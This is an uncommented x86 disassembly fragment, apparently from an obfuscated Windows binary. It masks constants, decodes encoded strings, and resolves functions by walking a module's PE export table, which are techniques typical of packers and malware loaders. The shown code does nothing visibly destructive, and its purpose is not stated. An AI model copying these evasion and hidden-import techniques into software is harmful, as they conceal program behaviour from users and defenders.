  426845:	lea    eax,[eax+ecx*2+0x64e5ee]
  42684c:	pop    esi
  42684d:	leave  
  42684e:	ret    
  42684f:	push   ebp
  426850:	mov    ebp,esp
  426852:	push   ecx
  426853:	push   esi
  426854:	push   edi
  426855:	mov    DWORD PTR [ebp-0x4],0xf89c85a6
  42685c:	mov    esi,0xf89c85a5
  426861:	call   0x4267c1
  426866:	mov    edi,eax
  426868:	mov    al,BYTE PTR [edi]
  42686a:	sub    al,0x4
  42686c:	xor    al,0x7f
  42686e:	cmp    al,0x83
  426870:	je     0x4268d3
  426872:	mov    eax,edi
  426874:	mov    edx,0xffcd8d0a
  426879:	mov    ecx,0x75108af
  42687e:	push   ebx
  42687f:	mov    ax,WORD PTR [eax]
  426882:	mov    ebx,0x3b5d
  426887:	sub    ax,bx
  42688a:	mov    ebx,0x8a9b
  42688f:	xor    ax,bx
  426892:	mov    ebx,0x4e4a
  426897:	cmp    ax,bx
  42689a:	jne    0x42689f
  42689c:	mov    DWORD PTR [ebp-0x4],esi
  42689f:	lea    esi,[edx+0x1]
  4268a2:	xor    esi,ecx
  4268a4:	mov    edx,esi
  4268a6:	xor    edx,ecx
  4268a8:	lea    eax,[edi+edx*2+0x64e5ec]
  4268af:	mov    bl,BYTE PTR [eax]
  4268b1:	sub    bl,0x4
  4268b4:	xor    bl,0x7f
  4268b7:	cmp    bl,0x83
  4268ba:	jne    0x42687f
  4268bc:	mov    eax,DWORD PTR [ebp-0x4]
  4268bf:	pop    ebx
  4268c0:	cmp    eax,0xf89c85a6
  4268c5:	je     0x4268d3
  4268c7:	xor    eax,ecx
  4268c9:	xor    ecx,ecx
  4268cb:	mov    WORD PTR [edi+eax*2+0x64e5ec],cx
  4268d3:	mov    eax,edi
  4268d5:	pop    edi
  4268d6:	pop    esi
  4268d7:	leave  
  4268d8:	ret    
  4268d9:	push   ebp
  4268da:	mov    ebp,esp
  4268dc:	push   ecx
  4268dd:	push   esi
  4268de:	mov    DWORD PTR [ebp-0x4],0xf89c85a6
  4268e5:	mov    esi,0xf89c85a5
  4268ea:	call   0x4267c1
  4268ef:	mov    cx,WORD PTR [eax]
  4268f2:	mov    edx,0x3b5d
  4268f7:	sub    cx,dx
  4268fa:	mov    edx,0x8a9b
  4268ff:	xor    cx,dx
  426902:	mov    edx,0x4e38
  426907:	cmp    cx,dx
  42690a:	je     0x426963
  42690c:	push   ebx
  42690d:	push   edi
  42690e:	movzx  ecx,cx
  426911:	mov    edx,0xffcd8d0a
  426916:	mov    edi,0x75108af
  42691b:	mov    ebx,0x4e4a
  426920:	cmp    cx,bx
  426923:	jne    0x426928
  426925:	mov    DWORD PTR [ebp-0x4],esi
  426928:	lea    esi,[edx+0x1]
  42692b:	xor    esi,edi
  42692d:	mov    edx,esi
  42692f:	xor    edx,edi
  426931:	mov    cx,WORD PTR [eax+edx*2+0x64e5ec]
  426939:	mov    ebx,0x3b5d
  42693e:	sub    cx,bx
  426941:	mov    ebx,0x8a9b
  426946:	xor    cx,bx
  426949:	mov    ebx,0x4e38
  42694e:	cmp    cx,bx
  426951:	jne    0x42691b
  426953:	cmp    DWORD PTR [ebp-0x4],0xf89c85a6
  42695a:	pop    edi
  42695b:	pop    ebx
  42695c:	je     0x426963
  42695e:	xor    eax,eax
  426960:	inc    eax
  426961:	jmp    0x426965
  426963:	xor    eax,eax
  426965:	pop    esi
  426966:	leave  
  426967:	ret    
  426968:	push   ebp
  426969:	mov    ebp,esp
  42696b:	push   ecx
  42696c:	mov    eax,DWORD PTR [ebp+0x8]
  42696f:	movzx  ecx,WORD PTR [eax]
  426972:	push   esi
  426973:	lea    eax,[ecx-0x3b5d]
  426979:	mov    esi,0x8a9b
  42697e:	push   edi
  42697f:	xor    eax,esi
  426981:	mov    edi,0x4e38
  426986:	mov    DWORD PTR [ebp-0x4],edx
  426989:	cmp    ax,di
  42698c:	je     0x4269b9
  42698e:	mov    eax,DWORD PTR [ebp+0x8]
  426991:	sub    eax,edx
  426993:	mov    DWORD PTR [ebp+0x8],eax
  426996:	jmp    0x42699b
  426998:	mov    eax,DWORD PTR [ebp+0x8]
  42699b:	mov    WORD PTR [edx],cx
  42699e:	add    edx,0x2
  4269a1:	movzx  edi,WORD PTR [eax+edx*1]
  4269a5:	mov    ecx,edi
  4269a7:	add    edi,0xffffc4a3
  4269ad:	xor    edi,esi
  4269af:	mov    eax,0x4e38
  4269b4:	cmp    di,ax
  4269b7:	jne    0x426998
  4269b9:	xor    eax,eax
  4269bb:	pop    edi
  4269bc:	mov    WORD PTR [edx],ax
  4269bf:	mov    eax,DWORD PTR [ebp-0x4]
  4269c2:	pop    esi
  4269c3:	leave  
  4269c4:	ret    0x4
  4269c7:	push   ebp
  4269c8:	mov    ebp,esp
  4269ca:	sub    esp,0x18
  4269cd:	mov    DWORD PTR [ebp-0x8],0xf89c85a5
  4269d4:	mov    DWORD PTR [ebp-0x18],0xf89c85a4
  4269db:	mov    ecx,DWORD PTR [ebp-0x8]
  4269de:	push   esi
  4269df:	mov    eax,0x75108af
  4269e4:	xor    ecx,eax
  4269e6:	mov    esi,0x3272f6
  4269eb:	add    ecx,esi
  4269ed:	mov    DWORD PTR [ebp-0x4],ecx
  4269f0:	mov    DWORD PTR [ebp-0xc],0xf89c85bd
  4269f7:	mov    DWORD PTR [ebp-0x10],0xf89c85a1
  4269fe:	push   edi
  4269ff:	mov    DWORD PTR [ebp-0x14],0xf89c85a3
  426a06:	jmp    0x426aa7
  426a0b:	mov    ecx,DWORD PTR [ebp-0x4]
  426a0e:	mov    edx,DWORD PTR [ebp+0x10]
  426a11:	sub    edx,ecx
  426a13:	mov    ecx,DWORD PTR [ebp-0xc]
  426a16:	xor    ecx,eax
  426a18:	add    ecx,esi
  426a1a:	cmp    edx,ecx
  426a1c:	jbe    0x426a39
  426a1e:	mov    edx,DWORD PTR [ebp-0x4]
  426a21:	add    edx,DWORD PTR [ebp+0x8]
  426a24:	mov    ecx,DWORD PTR [ebp-0x4]
  426a27:	add    ecx,DWORD PTR [ebp+0xc]
  426a2a:	mov    edi,DWORD PTR [ecx]
  426a2c:	mov    DWORD PTR [edx],edi
  426a2e:	mov    ecx,DWORD PTR [ecx+0x4]
  426a31:	mov    DWORD PTR [edx+0x4],ecx
  426a34:	mov    ecx,DWORD PTR [ebp-0xc]
  426a37:	jmp    0x426a86
  426a39:	mov    ecx,DWORD PTR [ebp-0x4]
  426a3c:	mov    edx,DWORD PTR [ebp+0x10]
  426a3f:	sub    edx,ecx
  426a41:	mov    ecx,DWORD PTR [ebp-0x10]
  426a44:	xor    ecx,eax
  426a46:	add    ecx,esi
  426a48:	cmp    edx,ecx
  426a4a:	mov    ecx,DWORD PTR [ebp-0x4]
  426a4d:	jbe    0x426a61
  426a4f:	add    ecx,DWORD PTR [ebp+0x8]
  426a52:	mov    edx,DWORD PTR [ebp-0x4]
  426a55:	add    edx,DWORD PTR [ebp+0xc]
  426a58:	mov    edx,DWORD PTR [edx]
  426a5a:	mov    DWORD PTR [ecx],edx
  426a5c:	mov    ecx,DWORD PTR [ebp-0x10]
  426a5f:	jmp    0x426a86
  426a61:	mov    edx,DWORD PTR [ebp+0x10]
  426a64:	sub    edx,ecx
  426a66:	mov    ecx,DWORD PTR [ebp-0x14]
  426a69:	xor    ecx,eax
  426a6b:	add    ecx,esi
  426a6d:	cmp    edx,ecx
  426a6f:	mov    ecx,DWORD PTR [ebp-0x4]
  426a72:	jbe    0x426a97
  426a74:	add    ecx,DWORD PTR [ebp+0x8]
  426a77:	mov    edx,DWORD PTR [ebp-0x4]
  426a7a:	add    edx,DWORD PTR [ebp+0xc]
  426a7d:	mov    dx,WORD PTR [edx]
  426a80:	mov    WORD PTR [ecx],dx
  426a83:	mov    ecx,DWORD PTR [ebp-0x14]
  426a86:	mov    edx,DWORD PTR [ebp-0x4]
  426a89:	xor    ecx,eax
  426a8b:	lea    ecx,[ecx+edx*1+0x3272f6]
  426a92:	mov    DWORD PTR [ebp-0x4],ecx
  426a95:	jmp    0x426aa7
  426a97:	add    ecx,DWORD PTR [ebp+0x8]
  426a9a:	mov    edx,DWORD PTR [ebp-0x4]
  426a9d:	add    edx,DWORD PTR [ebp+0xc]
  426aa0:	mov    dl,BYTE PTR [edx]
  426aa2:	mov    BYTE PTR [ecx],dl
  426aa4:	inc    DWORD PTR [ebp-0x4]
  426aa7:	mov    ecx,DWORD PTR [ebp-0x18]
  426aaa:	mov    edx,DWORD PTR [ebp+0x10]
  426aad:	xor    ecx,eax
  426aaf:	add    ecx,esi
  426ab1:	imul   ecx,edx
  426ab4:	mov    edx,DWORD PTR [ebp-0x8]
  426ab7:	mov    edi,DWORD PTR [ebp-0x4]
  426aba:	xor    edx,eax
  426abc:	lea    edx,[edx+edi*1+0x3272f6]
  426ac3:	cmp    edx,ecx
  426ac5:	jb     0x426a0b
  426acb:	pop    edi
  426acc:	pop    esi
  426acd:	leave  
  426ace:	ret    0xc
  426ad1:	push   ebp
  426ad2:	mov    ebp,esp
  426ad4:	sub    esp,0xc
  426ad7:	mov    DWORD PTR [ebp-0x4],0xf89c85a5
  426ade:	push   esi
  426adf:	mov    esi,eax
  426ae1:	mov    DWORD PTR [ebp-0x8],0xf89c85a4
  426ae8:	mov    edx,DWORD PTR [ebp-0x4]
  426aeb:	mov    eax,0x75108af
  426af0:	xor    edx,eax
  426af2:	mov    ecx,0x3272f6
  426af7:	add    edx,ecx
  426af9:	cmp    esi,edx
  426afb:	je     0x426b3d
  426afd:	push   ebx
  426afe:	push   edi
  426aff:	mov    edx,DWORD PTR [ebp-0x8]
  426b02:	mov    ebx,DWORD PTR [ebp+0x8]
  426b05:	xor    edx,eax
  426b07:	mov    edi,0xffcd8d0a
  426b0c:	sub    edi,edx
  426b0e:	add    esi,edi
  426b10:	lea    edx,[esi-0x3272f6]
  426b16:	xor    edx,eax
  426b18:	mov    DWORD PTR [ebp-0xc],edx
  426b1b:	mov    edx,DWORD PTR [ebp-0x4]
  426b1e:	mov    edi,DWORD PTR [ebp-0xc]
  426b21:	xor    dl,0xaf
  426b24:	sub    dl,0xa
  426b27:	xor    edi,eax
  426b29:	mov    BYTE PTR [edi+ebx*1+0x3272f6],dl
  426b30:	mov    edx,DWORD PTR [ebp-0x4]
  426b33:	xor    edx,eax
  426b35:	add    edx,ecx
  426b37:	cmp    esi,edx
  426b39:	jne    0x426aff
  426b3b:	pop    edi
  426b3c:	pop    ebx
  426b3d:	pop    esi
  426b3e:	leave  
  426b3f:	ret    0x4
  426b42:	push   ebp
  426b43:	mov    ebp,esp
  426b45:	sub    esp,0x21c
  426b4b:	mov    DWORD PTR [ebp-0x4],0xf89c85a5
  426b52:	mov    DWORD PTR [ebp-0x14],0xf89c85a4
  426b59:	mov    eax,DWORD PTR [ebp+0x10]
  426b5c:	mov    eax,DWORD PTR [ebp-0x4]
  426b5f:	mov    ecx,DWORD PTR [ebp+0x8]
  426b62:	push   esi
  426b63:	push   edi
  426b64:	mov    edi,0x75108af
  426b69:	xor    eax,edi
  426b6b:	mov    esi,0x3272f6
  426b70:	add    eax,esi
  426b72:	cmp    eax,ecx
  426b74:	mov    eax,DWORD PTR [ebp-0x4]
  426b77:	jne    0x426b82
  426b79:	xor    eax,edi
  426b7b:	add    eax,esi
  426b7d:	jmp    0x426c2e
  426b82:	mov    ecx,DWORD PTR [ebp+0xc]
  426b85:	xor    eax,edi
  426b87:	add    eax,esi
  426b89:	cmp    eax,ecx
  426b8b:	jne    0x426b92
  426b8d:	mov    eax,DWORD PTR [ebp-0x4]
  426b90:	jmp    0x426b79
  426b92:	lea    eax,[ebp-0x21c]
  426b98:	mov    DWORD PTR [ebp-0x8],eax
  426b9b:	mov    eax,DWORD PTR [ebp+0xc]
  426b9e:	mov    DWORD PTR [ebp-0x10],eax
  426ba1:	mov    eax,DWORD PTR [ebp-0x4]
  426ba4:	xor    eax,edi
  426ba6:	add    eax,esi
  426ba8:	mov    DWORD PTR [ebp+0x10],eax
  426bab:	mov    eax,DWORD PTR [ebp+0xc]
  426bae:	push   ebx
  426baf:	call   0x4268d9
  426bb4:	mov    ebx,eax
  426bb6:	mov    eax,DWORD PTR [ebp+0x8]
  426bb9:	mov    eax,DWORD PTR [eax+0x14]
  426bbc:	jmp    0x426c16
  426bbe:	mov    eax,DWORD PTR [ebp+0xc]
  426bc1:	sub    eax,0x8
  426bc4:	mov    DWORD PTR [ebp-0xc],eax
  426bc7:	mov    eax,DWORD PTR [ebp-0xc]
  426bca:	mov    eax,DWORD PTR [eax+0x28]
  426bcd:	call   0x4267c1
  426bd2:	mov    DWORD PTR [ebp+0x10],eax
  426bd5:	push   DWORD PTR [ebp+0x10]
  426bd8:	mov    edx,DWORD PTR [ebp-0x8]
  426bdb:	call   0x426968
  426be0:	mov    eax,DWORD PTR [ebp-0x4]
  426be3:	xor    eax,edi
  426be5:	add    eax,esi
  426be7:	cmp    eax,ebx
  426be9:	jne    0x426bf3
  426beb:	mov    eax,DWORD PTR [ebp-0x8]
  426bee:	call   0x42684f
  426bf3:	mov    eax,DWORD PTR [ebp-0x14]
  426bf6:	xor    eax,edi
  426bf8:	add    eax,esi
  426bfa:	push   eax
  426bfb:	push   DWORD PTR [ebp-0x10]
  426bfe:	mov    eax,DWORD PTR [ebp-0x8]
  426c01:	call   0x42657b
  426c06:	mov    ecx,DWORD PTR [ebp-0x4]
  426c09:	xor    ecx,edi
  426c0b:	add    ecx,esi
  426c0d:	cmp    eax,ecx
  426c0f:	je     0x426c34
  426c11:	mov    eax,DWORD PTR [ebp+0xc]
  426c14:	mov    eax,DWORD PTR [eax]
  426c16:	mov    DWORD PTR [ebp+0xc],eax
  426c19:	mov    eax,DWORD PTR [ebp+0x8]
  426c1c:	mov    ecx,DWORD PTR [ebp+0xc]
  426c1f:	add    eax,0x14
  426c22:	cmp    ecx,eax
  426c24:	jne    0x426bbe
  426c26:	mov    eax,DWORD PTR [ebp-0x4]
  426c29:	xor    eax,edi
  426c2b:	add    eax,esi
  426c2d:	pop    ebx
  426c2e:	pop    edi
  426c2f:	pop    esi
  426c30:	leave  
  426c31:	ret    0xc
  426c34:	mov    eax,DWORD PTR [ebp-0xc]
  426c37:	mov    eax,DWORD PTR [eax+0x18]
  426c3a:	jmp    0x426c2d
  426c3c:	push   ebp
  426c3d:	mov    ebp,esp
  426c3f:	mov    eax,DWORD PTR [ebp+0xc]
  426c42:	sub    esp,0x10
  426c45:	cmp    DWORD PTR [ebp+0x8],0x0
  426c49:	push   ebx
  426c4a:	push   esi
  426c4b:	push   edi
  426c4c:	je     0x426d01
  426c52:	test   eax,eax
  426c54:	je     0x426d01
  426c5a:	movzx  eax,WORD PTR [eax+0x20]
  426c5e:	mov    ecx,eax
  426c60:	mov    DWORD PTR [ebp-0x10],eax
  426c63:	xor    edx,edx
  426c65:	and    DWORD PTR [ebp-0x8],edx
  426c68:	mov    eax,0x8a9b
  426c6d:	xor    ecx,eax
  426c6f:	add    ecx,0x3b5d
  426c75:	mov    DWORD PTR [ebp-0xc],ecx
  426c78:	and    DWORD PTR [ebp-0x4],0x0
  426c7c:	xor    ecx,ecx
  426c7e:	push   0xffffff81
  426c80:	pop    edi
  426c81:	cmp    cx,WORD PTR [ebp-0xc]
  426c85:	jae    0x426ceb
  426c87:	lea    esi,[edx-0x3b5d]
  426c8d:	xor    esi,eax
  426c8f:	movzx  ecx,WORD PTR [ebp-0x4]
  426c93:	mov    ebx,DWORD PTR [ebp+0xc]
  426c96:	lea    ecx,[ebx+ecx*4]
  426c99:	cmp    WORD PTR [ecx+0x2],si
  426c9d:	jne    0x426cd6
  426c9f:	movzx  ecx,WORD PTR [ecx]
  426ca2:	mov    edi,0x4e38
  426ca7:	cmp    cx,di
  426caa:	jne    0x426cb8
  426cac:	mov    ebx,DWORD PTR [ebp+0x8]
  426caf:	movzx  edi,dx
  426cb2:	cmp    BYTE PTR [edi+ebx*1],0x0
  426cb6:	je     0x426ce5
  426cb8:	mov    ebx,DWORD PTR [ebp+0x8]
  426cbb:	movzx  edi,dx
  426cbe:	movsx  di,BYTE PTR [edi+ebx*1]
  426cc3:	mov    ebx,0x3b5d
  426cc8:	sub    di,bx
  426ccb:	xor    di,ax
  426cce:	cmp    cx,di
  426cd1:	je     0x426ce5
  426cd3:	push   0xffffff83
  426cd5:	pop    edi
  426cd6:	inc    DWORD PTR [ebp-0x4]
  426cd9:	mov    cx,WORD PTR [ebp-0xc]
  426cdd:	cmp    WORD PTR [ebp-0x4],cx
  426ce1:	jb     0x426c8f
  426ce3:	jmp    0x426ceb
  426ce5:	inc    DWORD PTR [ebp-0x8]
  426ce8:	push   0xffffff82
  426cea:	pop    edi
  426ceb:	mov    esi,DWORD PTR [ebp+0x8]
  426cee:	movzx  ecx,dx
  426cf1:	cmp    BYTE PTR [ecx+esi*1],0x0
  426cf5:	je     0x426d0a
  426cf7:	inc    edx
  426cf8:	cmp    edi,0xffffff83
  426cfb:	jne    0x426c78
  426d01:	xor    eax,eax
  426d03:	pop    edi
  426d04:	pop    esi
  426d05:	pop    ebx
  426d06:	leave  
  426d07:	ret    0x8
  426d0a:	mov    ecx,DWORD PTR [ebp-0x8]
  426d0d:	add    ecx,0xffffc4a3
  426d13:	xor    cx,ax
  426d16:	xor    eax,eax
  426d18:	cmp    cx,WORD PTR [ebp-0x10]
  426d1c:	sete   al
  426d1f:	jmp    0x426d03
  426d21:	push   ebp
  426d22:	mov    ebp,esp
  426d24:	sub    esp,0x50
  426d27:	push   edi
  426d28:	mov    edi,eax
  426d2a:	mov    eax,DWORD PTR [edi+0x1a8]
  426d30:	cmp    DWORD PTR [eax],0x0
  426d33:	jne    0x426d3c
  426d35:	xor    eax,eax
  426d37:	jmp    0x426e6d
  426d3c:	push   DWORD PTR [ebp+0x8]
  426d3f:	push   0x2c
  426d41:	pop    eax
  426d42:	call   0x426ad1
  426d47:	mov    edx,DWORD PTR [edi+0x1ac]
  426d4d:	lea    eax,[edi+0x22]
  426d50:	mov    DWORD PTR [ebp-0x4c],eax
  426d53:	lea    eax,[edi+0x44]
  426d56:	mov    DWORD PTR [ebp-0x48],eax
  426d59:	lea    eax,[edi+0x66]
  426d5c:	mov    DWORD PTR [ebp-0x44],eax
  426d5f:	lea    eax,[edi+0x88]
  426d65:	mov    DWORD PTR [ebp-0x40],eax
  426d68:	lea    eax,[edi+0xaa]
  426d6e:	mov    DWORD PTR [ebp-0x3c],eax
  426d71:	lea    eax,[edi+0xcc]
  426d77:	mov    DWORD PTR [ebp-0x38],eax
  426d7a:	lea    eax,[edi+0xee]
  426d80:	mov    DWORD PTR [ebp-0x34],eax
  426d83:	lea    eax,[edi+0x110]
  426d89:	mov    DWORD PTR [ebp-0x30],eax
  426d8c:	lea    eax,[edi+0x132]
  426d92:	mov    DWORD PTR [ebp-0x2c],eax
  426d95:	lea    eax,[edi+0x154]
  426d9b:	push   edi
  426d9c:	mov    DWORD PTR [ebp-0x50],edi
  426d9f:	mov    DWORD PTR [ebp-0x28],eax
  426da2:	call   0x426ea1
  426da7:	push   eax
  426da8:	mov    eax,DWORD PTR [edi+0x1a8]
  426dae:	push   DWORD PTR [eax]
  426db0:	call   0x426b42
  426db5:	mov    DWORD PTR [ebp-0x10],eax
  426db8:	test   eax,eax
  426dba:	je     0x426e6d
  426dc0:	mov    ecx,DWORD PTR [eax+0x3c]
  426dc3:	push   ebx
  426dc4:	push   esi
  426dc5:	mov    esi,DWORD PTR [ecx+eax*1+0x78]
  426dc9:	add    esi,eax
  426dcb:	mov    edi,DWORD PTR [esi+0x24]
  426dce:	mov    ecx,DWORD PTR [esi+0x1c]
  426dd1:	mov    edx,DWORD PTR [esi+0x20]
  426dd4:	mov    ebx,DWORD PTR [esi+0x18]
  426dd7:	add    edi,eax
  426dd9:	mov    DWORD PTR [ebp-0x20],edi
  426ddc:	mov    edi,DWORD PTR [esi+0x14]
  426ddf:	add    ecx,eax
  426de1:	add    edx,eax
  426de3:	mov    DWORD PTR [ebp-0xc],ecx
  426de6:	mov    DWORD PTR [ebp-0x1c],edx
  426de9:	mov    DWORD PTR [ebp-0x8],edi
  426dec:	cmp    edi,ebx
  426dee:	ja     0x426df3
  426df0:	mov    DWORD PTR [ebp-0x8],ebx
  426df3:	xor    ebx,ebx
  426df5:	mov    DWORD PTR [ebp-0x18],ebx
  426df8:	cmp    DWORD PTR [ebp-0x8],ebx
  426dfb:	jbe    0x426e6b
  426dfd:	jmp    0x426e02
  426dff:	mov    edx,DWORD PTR [ebp-0x1c]
  426e02:	mov    edi,DWORD PTR [ebp-0x20]
  426e05:	movzx  edi,WORD PTR [edi+ebx*2]
  426e09:	cmp    ebx,DWORD PTR [esi+0x18]
  426e0c:	jae    0x426e6b
  426e0e:	cmp    edi,DWORD PTR [esi+0x14]
  426e11:	jae    0x426e6b
  426e13:	mov    ebx,DWORD PTR [edx+ebx*4]
  426e16:	mov    edx,DWORD PTR [ebp+0x8]
  426e19:	mov    edi,DWORD PTR [ecx+edi*4]
  426e1c:	mov    DWORD PTR [ebp-0x4],edx
  426e1f:	lea    edx,[ebp-0x50]
  426e22:	add    ebx,eax
  426e24:	add    edi,eax
  426e26:	sub    edx,DWORD PTR [ebp+0x8]
  426e29:	mov    DWORD PTR [ebp-0x14],0xb
  426e30:	mov    DWORD PTR [ebp-0x24],edx
  426e33:	mov    edx,DWORD PTR [ebp-0x4]
  426e36:	cmp    DWORD PTR [edx],0x0
  426e39:	jne    0x426e56
  426e3b:	mov    eax,DWORD PTR [ebp-0x24]
  426e3e:	push   DWORD PTR [eax+edx*1]
  426e41:	push   ebx
  426e42:	call   0x426c3c
  426e47:	mov    ecx,DWORD PTR [ebp-0xc]
  426e4a:	test   eax,eax
  426e4c:	je     0x426e53
  426e4e:	mov    eax,DWORD PTR [ebp-0x4]
  426e51:	mov    DWORD PTR [eax],edi
  426e53:	mov    eax,DWORD PTR [ebp-0x10]
  426e56:	add    DWORD PTR [ebp-0x4],0x4
  426e5a:	dec    DWORD PTR [ebp-0x14]
  426e5d:	jne    0x426e33
  426e5f:	mov    ebx,DWORD PTR [ebp-0x18]
  426e62:	inc    ebx
  426e63:	mov    DWORD PTR [ebp-0x18],ebx
  426e66:	cmp    ebx,DWORD PTR [ebp-0x8]
  426e69:	jb     0x426dff
  426e6b:	pop    esi
  426e6c:	pop    ebx
  426e6d:	pop    edi
  426e6e:	leave  
  426e6f:	ret    0x4
  426e72:	push   ebp
  426e73:	mov    ebp,esp
  426e75:	mov    eax,DWORD PTR [ebp+0x8]
  426e78:	push   esi
  426e79:	push   DWORD PTR [eax+0x1e0]
  426e7f:	lea    esi,[eax+0x198]
  426e85:	mov    eax,DWORD PTR [ebp+0x8]
  426e88:	call   0x426d21
  426e8d:	mov    ecx,DWORD PTR [esi]
  426e8f:	mov    DWORD PTR [ecx],eax
  426e91:	mov    eax,DWORD PTR [esi]
  426e93:	xor    ecx,ecx
  426e95:	cmp    DWORD PTR [eax],ecx
  426e97:	pop    esi
  426e98:	setne  cl
  426e9b:	mov    eax,ecx
  426e9d:	pop    ebp
  426e9e:	ret    0x4
  426ea1:	mov    ecx,DWORD PTR [edi+0x188]
  426ea7:	push   ebx
  426ea8:	jmp    0x426ebd
  426eaa:	xor    eax,0x8a9b
  426eaf:	add    eax,0x3b5d
  426eb4:	mov    WORD PTR [ecx],ax
  426eb7:	add    ecx,0x2
  426eba:	add    edx,0x2
  426ebd:	movzx  eax,WORD PTR [edx]
  426ec0:	mov    ebx,0x4e38
  426ec5:	cmp    ax,bx
  426ec8:	jne    0x426eaa
  426eca:	xor    eax,eax
  426ecc:	mov    WORD PTR [ecx],ax
  426ecf:	mov    eax,DWORD PTR [edi+0x188]
  426ed5:	pop    ebx
  426ed6:	ret    
  426ed7:	push   edi
  426ed8:	mov    edi,eax
  426eda:	mov    eax,DWORD PTR [esi+0x188]
  426ee0:	shl    edi,0x6
  426ee3:	add    eax,edi
  426ee5:	jmp    0x426ef1
  426ee7:	xor    cl,0x7f
  426eea:	add    cl,0x4
  426eed:	mov    BYTE PTR [eax],cl
  426eef:	inc    eax
  426ef0:	inc    edx
  426ef1:	mov    cl,BYTE PTR [edx]
  426ef3:	cmp    cl,0x83
  426ef6:	jne    0x426ee7
  426ef8:	mov    BYTE PTR [eax],0x0
  426efb:	mov    eax,DWORD PTR [esi+0x188]
  426f01:	add    eax,edi
  426f03:	pop    edi
  426f04:	ret    
  426f05:	push   ebp
  426f06:	mov    ebp,esp
  426f08:	sub    esp,0x14
  426f0b:	mov    DWORD PTR [ebp-0x10],0xf89c85a5
  426f12:	mov    DWORD PTR [ebp-0x4],0xf89c85a4
  426f19:	mov    eax,DWORD PTR [ebx]
  426f1b:	mov    DWORD PTR [ebp-0x8],eax
  426f1e:	mov    DWORD PTR [ebp-0xc],0xf89c85bd
  426f25:	push   esi
  426f26:	push   edi
  426f27:	mov    DWORD PTR [ebp-0x14],0xead71885
  426f2e:	mov    edi,DWORD PTR [ebp-0x4]
  426f31:	mov    ecx,DWORD PTR [ebp-0x10]
  426f34:	mov    eax,0x75108af
  426f39:	xor    edi,eax
  426f3b:	mov    edx,0x3272f6
  426f40:	xor    ecx,eax
  426f42:	add    edi,edx
  426f44:	add    ecx,edx
  426f46:	imul   edi,ecx
  426f49:	jmp    0x426f91
  426f4b:	mov    ecx,DWORD PTR [ebp-0x8]
  426f4e:	mov    esi,DWORD PTR [ebp-0x4]
  426f51:	xor    ecx,eax
  426f53:	xor    esi,eax
  426f55:	add    ecx,edx
  426f57:	add    esi,edx
  426f59:	test   esi,ecx
  426f5b:	mov    esi,DWORD PTR [ebp-0x8]
  426f5e:	mov    ecx,DWORD PTR [ebp-0x4]
  426f61:	je     0x426f78
  426f63:	xor    ecx,eax
  426f65:	xor    esi,eax
  426f67:	add    ecx,edx
  426f69:	add    esi,edx
  426f6b:	shr    esi,cl
  426f6d:	mov    ecx,DWORD PTR [ebp-0x14]
  426f70:	xor    ecx,eax
  426f72:	add    ecx,edx
  426f74:	xor    esi,ecx
  426f76:	jmp    0x426f82
  426f78:	xor    esi,eax
  426f7a:	xor    ecx,eax
  426f7c:	add    esi,edx
  426f7e:	add    ecx,edx
  426f80:	shr    esi,cl
  426f82:	mov    DWORD PTR [ebp-0x8],esi
  426f85:	mov    ecx,DWORD PTR [ebp-0x4]
  426f88:	xor    ecx,eax
  426f8a:	lea    edi,[edi+ecx*1+0x3272f6]
  426f91:	mov    ecx,DWORD PTR [ebp-0xc]
  426f94:	mov    esi,DWORD PTR [ebp-0x4]
  426f97:	xor    esi,eax
  426f99:	xor    ecx,eax
  426f9b:	sub    ecx,esi
  426f9d:	cmp    edi,ecx
  426f9f:	jbe    0x426f4b
  426fa1:	mov    eax,DWORD PTR [ebp-0x8]
  426fa4:	pop    edi
  426fa5:	mov    DWORD PTR [ebx],eax
  426fa7:	mov    eax,DWORD PTR [ebp-0x8]
  426faa:	pop    esi
  426fab:	leave  
  426fac:	ret    
  426fad:	push   ebp
  426fae:	mov    ebp,esp
  426fb0:	sub    esp,0x38
  426fb3:	push   ebx
  426fb4:	mov    ebx,0xf89c85a5
  426fb9:	mov    DWORD PTR [ebp-0x4],ebx
  426fbc:	lea    ecx,[ebx-0x1]
  426fbf:	mov    DWORD PTR [ebp-0x24],ecx
  426fc2:	mov    eax,DWORD PTR [ebp-0x4]
  426fc5:	mov    edx,DWORD PTR [ebp+0x8]
  426fc8:	push   esi
  426fc9:	mov    esi,0x75108af
  426fce:	xor    eax,esi
  426fd0:	push   edi
  426fd1:	mov    edi,0x3272f6
  426fd6:	add    eax,edi
  426fd8:	cmp    edx,eax
  426fda:	mov    eax,DWORD PTR [ebp-0x4]
  426fdd:	je     0x427142
  426fe3:	mov    edx,DWORD PTR [ebp+0xc]
  426fe6:	xor    eax,esi
  426fe8:	add    eax,edi
  426fea:	cmp    edx,eax
  426fec:	je     0x42713f
  426ff2:	mov    eax,DWORD PTR [ebp+0x10]
  426ff5:	mov    edx,DWORD PTR [ebp+0xc]
  426ff8:	mov    DWORD PTR [ebp-0x14],eax
  426ffb:	mov    eax,DWORD PTR [ebp+0x8]
  426ffe:	mov    DWORD PTR [ebp-0x18],0xf89c853c
  427005:	mov    DWORD PTR [ebp-0xc],eax
  427008:	lea    eax,[ebx-0x2]
  42700b:	mov    DWORD PTR [ebp-0x1c],eax
  42700e:	mov    DWORD PTR [ebp-0x10],ebx
  427011:	mov    DWORD PTR [ebp+0xc],ecx
  427014:	mov    DWORD PTR [ebp+0x10],eax
  427017:	mov    eax,DWORD PTR [ebp+0xc]
  42701a:	xor    eax,esi
  42701c:	mov    DWORD PTR [ebp-0x20],edx
  42701f:	sub    edx,eax
  427021:	sub    edx,edi
  427023:	mov    DWORD PTR [ebp+0x8],edx
  427026:	mov    DWORD PTR [ebp-0x8],0xf89c85a0
  42702d:	jmp    0x42712f
  427032:	mov    eax,DWORD PTR [ebp+0xc]
  427035:	mov    ecx,DWORD PTR [ebp+0xc]
  427038:	xor    eax,esi
  42703a:	xor    ecx,esi
  42703c:	lea    ecx,[eax+ecx*1+0x64e5ec]
  427043:	mov    eax,DWORD PTR [ebp+0x8]
  427046:	xor    edx,edx
  427048:	div    ecx
  42704a:	mov    eax,DWORD PTR [ebp+0x10]
  42704d:	mov    ecx,DWORD PTR [ebp+0xc]
  427050:	xor    eax,esi
  427052:	xor    ecx,esi
  427054:	sub    eax,ecx
  427056:	cmp    edx,eax
  427058:	jne    0x4270ee
  42705e:	mov    eax,DWORD PTR [ebp+0x8]
  427061:	mov    ecx,DWORD PTR [ebp-0xc]
  427064:	mov    dl,BYTE PTR [eax+ecx*1]
  427067:	mov    eax,DWORD PTR [ebp-0x10]
